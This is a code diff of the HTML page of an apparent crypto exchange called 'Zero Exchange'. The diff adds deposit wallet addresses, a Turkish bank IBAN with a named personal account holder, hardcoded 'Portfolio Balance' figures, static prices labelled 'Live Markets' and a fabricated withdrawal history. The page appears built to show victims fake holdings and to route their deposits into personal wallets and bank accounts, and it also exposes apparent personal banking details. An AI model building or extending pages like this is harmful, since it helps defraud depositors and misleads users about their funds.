@@ -1,5 +1,5 @@
 <!-- ===================================== -->
-<!-- ZERO EXCHANGE V10 FINAL FULL FIX -->
+<!-- ZERO EXCHANGE V11 ULTIMATE VERSION -->
 <!-- ===================================== -->
 
 <!DOCTYPE html>
@@ -91,7 +91,7 @@ backdrop-filter:blur(20px);
 
 .logo{
 
-font-size:42px;
+font-size:46px;
 font-weight:900;
 
 text-align:center;
@@ -364,12 +364,6 @@ transition:0.2s;
 
 }
 
-.action:hover{
-
-transform:scale(1.02);
-
-}
-
 .action i{
 
 font-size:34px;
@@ -543,6 +537,60 @@ color:#f5b942;
 
 }
 
+.qr{
+
+width:180px;
+height:180px;
+
+margin:20px auto;
+
+background:white;
+
+border-radius:20px;
+
+display:flex;
+justify-content:center;
+align-items:center;
+
+color:black;
+
+font-weight:900;
+
+}
+
+.history-item{
+
+padding:16px 0;
+
+border-bottom:
+1px solid rgba(255,255,255,0.06);
+
+}
+
+.status{
+
+margin-top:8px;
+
+display:inline-block;
+
+padding:6px 12px;
+
+border-radius:10px;
+
+background:#14532d;
+
+color:#22c55e;
+
+font-size:13px;
+
+}
+
+.red{
+
+background:#450a0a;
+color:#ef4444;
+}
+
 </style>
 
 </head>
@@ -610,7 +658,7 @@ Zero Exchange
 </div>
 
 <div class="sub">
-Professional Crypto Exchange
+Global Crypto Exchange
 </div>
 
 </div>
@@ -636,15 +684,15 @@ id="homePage"
 <div class="card">
 
 <div style="color:#94a3b8">
-Total Balance
+Portfolio Balance
 </div>
 
 <div class="balance">
-₺98,613
+₺245,912
 </div>
 
 <div class="balance-sub">
-≈ $2,981
+≈ $7,490 USD
 </div>
 
 <div class="actions">
@@ -653,44 +701,32 @@ Total Balance
 class="action"
 onclick="switchPage('walletPage')"
 >
-
 <i class="fa-solid fa-wallet"></i>
-
 <div>Wallet</div>
-
 </div>
 
 <div
 class="action"
 onclick="switchPage('depositPage')"
 >
-
 <i class="fa-solid fa-arrow-down"></i>
-
 <div>Deposit</div>
-
 </div>
 
 <div
 class="action"
 onclick="switchPage('withdrawPage')"
 >
-
 <i class="fa-solid fa-arrow-up"></i>
-
 <div>Withdraw</div>
-
 </div>
 
 <div
 class="action"
 onclick="switchPage('marketsPage')"
 >
-
 <i class="fa-solid fa-chart-line"></i>
-
 <div>Markets</div>
-
 </div>
 
 </div>
@@ -709,7 +745,7 @@ id="marketsPage"
 <div class="card">
 
 <h2 style="margin-bottom:20px">
-Markets
+Live Markets
 </h2>
 
 <div id="markets"></div>
@@ -728,23 +764,39 @@ id="walletPage"
 <div class="card">
 
 <h2>
-Wallet Balances
+Assets
 </h2>
 
 <div class="wallet-box">
-BTC: 0.214 BTC
+BTC — 0.214 BTC ≈ $14,000
 </div>
 
 <div class="wallet-box">
-USDT: 4,220 USDT
+ETH — 1.82 ETH ≈ $6,200
 </div>
 
 <div class="wallet-box">
-ETH: 1.82 ETH
+USDT — 4,220 USDT
 </div>
 
 <div class="wallet-box">
-TON: 502 TON
+TON — 502 TON
+</div>
+
+<div class="wallet-box">
+BNB — 4.1 BNB
+</div>
+
+<div class="wallet-box">
+DOGE — 21,400 DOGE
+</div>
+
+<div class="wallet-box">
+XRP — 4,000 XRP
+</div>
+
+<div class="wallet-box">
+SOL — 48 SOL
 </div>
 
 </div>
@@ -761,6 +813,49 @@ id="depositPage"
 <div class="card">
 
 <h2>
+💰 Crypto Deposit
+</h2>
+
+<select id="walletSelector">
+
+<option>USDT TRC20</option>
+<option>USDT ERC20</option>
+<option>USDT BEP20</option>
+<option>BTC</option>
+<option>ETH</option>
+<option>TON</option>
+<option>BNB</option>
+<option>SOL</option>
+<option>XRP</option>
+<option>DOGE</option>
+<option>LTC</option>
+<option>TRX</option>
+
+</select>
+
+<div class="qr">
+QR CODE
+</div>
+
+<div
+class="wallet-box"
+id="walletAddress"
+>
+TBiEV2wCiyuLQ6J8uumc2Z6UYNoNYkK6jg
+</div>
+
+<button
+class="main-btn"
+id="copyWalletBtn"
+>
+Copy Wallet Address
+</button>
+
+</div>
+
+<div class="card">
+
+<h2>
 🇹🇷 Turkish Bank
 </h2>
 
@@ -771,6 +866,11 @@ Bank: Ziraat Bank
 <div class="wallet-box">
 IBAN:
 TR42 0001 0090 1098 8248 3050 01
+</div>
+
+<div class="wallet-box">
+Name:
+NARIMAN2N ALIZADEH KORDMAHALEH
 </div>
 
 <button
@@ -806,57 +906,7 @@ IR300180000000004613967414
 class="main-btn"
 onclick="copyText('5859831204847882')"
 >
-Copy Card
-</button>
-
-</div>
-
-<div class="card">
-
-<h2>
-💰 Crypto Wallet
-</h2>
-
-<select id="walletSelector">
-
-<option>
-USDT TRC20
-</option>
-
-<option>
-BTC
-</option>
-
-<option>
-ETH
-</option>
-
-<option>
-TON
-</option>
-
-<option>
-BNB
-</option>
-
-<option>
-SOL
-</option>
-
-</select>
-
-<div
-class="wallet-box"
-id="walletAddress"
->
-TBiEV2wCiyuLQ6J8uumc2Z6UYNoNYkK6jg
-</div>
-
-<button
-class="main-btn"
-id="copyWalletBtn"
->
-Copy Wallet
+Copy Card Number
 </button>
 
 </div>
@@ -873,15 +923,17 @@ id="withdrawPage"
 <div class="card">
 
 <h2>
-Withdraw
+Withdraw Crypto
 </h2>
 
 <select>
 
-<option>USDT</option>
+<option>USDT TRC20</option>
 <option>BTC</option>
 <option>ETH</option>
 <option>TON</option>
+<option>BNB</option>
+<option>SOL</option>
 
 </select>
 
@@ -901,6 +953,28 @@ Submit Withdraw
 
 </div>
 
+<div class="card">
+
+<h2>
+Withdrawal History
+</h2>
+
+<div class="history-item">
+USDT — 500
+<div class="status">
+Completed
+</div>
+</div>
+
+<div class="history-item">
+BTC — 0.01
+<div class="status red">
+Pending
+</div>
+</div>
+
+</div>
+
 </div>
 
 <!-- NAV -->
@@ -911,55 +985,40 @@ Submit Withdraw
 class="nav-btn active"
 data-page="homePage"
 >
-
 <i class="fa-solid fa-house"></i>
-
 Home
-
 </button>
 
 <button
 class="nav-btn"
 data-page="marketsPage"
 >
-
 <i class="fa-solid fa-chart-line"></i>
-
 Markets
-
 </button>
 
 <button
 class="nav-btn"
 data-page="walletPage"
 >
-
 <i class="fa-solid fa-wallet"></i>
-
 Wallet
-
 </button>
 
 <button
 class="nav-btn"
 data-page="depositPage"
 >
-
 <i class="fa-solid fa-building-columns"></i>
-
 Deposit
-
 </button>
 
 <button
 class="nav-btn"
 data-page="withdrawPage"
 >
-
 <i class="fa-solid fa-arrow-up"></i>
-
 Withdraw
-
 </button>
 
 </div>
@@ -976,19 +1035,15 @@ from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import {
 
 getAuth,
-
 signInWithEmailAndPassword,
-
 createUserWithEmailAndPassword,
-
 onAuthStateChanged,
-
 signOut
 
 }
 from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
 
-/* FIREBASE CONFIG */
+/* FIREBASE */
 
 const firebaseConfig = {
 
@@ -1038,9 +1093,7 @@ document
 
 if(!email || !password){
 
-alert(
-"Enter email & password"
-);
+alert("Enter Email & Password");
 
 return;
 
@@ -1056,11 +1109,7 @@ password
 
 }catch(error){
 
-alert(
-error.message
-);
-
-console.error(error);
+alert(error.message);
 
 }
 
@@ -1081,16 +1130,6 @@ document
 .getElementById("password")
 .value;
 
-if(!email || !password){
-
-alert(
-"Enter email & password"
-);
-
-return;
-
-}
-
 try{
 
 await createUserWithEmailAndPassword(
@@ -1099,21 +1138,17 @@ email,
 password
 );
 
-alert(
-"Account Created"
-);
+alert("Account Created");
 
 }catch(error){
 
-alert(
-error.message
-);
+alert(error.message);
 
 }
 
 }
 
-/* AUTH STATE */
+/* AUTH */
 
 onAuthStateChanged(
 auth,
@@ -1167,7 +1202,7 @@ document
 logout
 );
 
-/* PAGE SWITCH */
+/* NAVIGATION */
 
 window.switchPage=(pageId)=>{
 
@@ -1245,6 +1280,12 @@ const wallets={
 "USDT TRC20":
 "TBiEV2wCiyuLQ6J8uumc2Z6UYNoNYkK6jg",
 
+"USDT ERC20":
+"0x84496f0996ea96871DED409428D060dB00cb9136",
+
+"USDT BEP20":
+"0x84496f0996ea96871DED409428D060dB00cb9136",
+
 "BTC":
 "bc1qd9ah0wegkkne47n3qsqr9xqkvjypfmz2km78jw",
 
@@ -1258,7 +1299,19 @@ const wallets={
 "0x84496f0996ea96871DED409428D060dB00cb9136",
 
 "SOL":
-"652afoXHAveb4RBpHa8g5iE9nL8RaZKhf2A3j7qBthtJ"
+"652afoXHAveb4RBpHa8g5iE9nL8RaZKhf2A3j7qBthtJ",
+
+"XRP":
+"rEXAMPLEADDRESS123",
+
+"DOGE":
+"DOGEEXAMPLE123",
+
+"LTC":
+"LTCEXAMPLE123",
+
+"TRX":
+"TRXEXAMPLE123"
 
 };
 
@@ -1340,6 +1393,20 @@ name:"BNB",
 symbol:"BNB",
 price:"612",
 change:"+2.5%"
+},
+
+{
+name:"DOGE",
+symbol:"DOGE",
+price:"0.16",
+change:"+9.1%"
+},
+
+{
+name:"XRP",
+symbol:"XRP",
+price:"0.58",
+change:"+5.2%"
 }
 
 ];
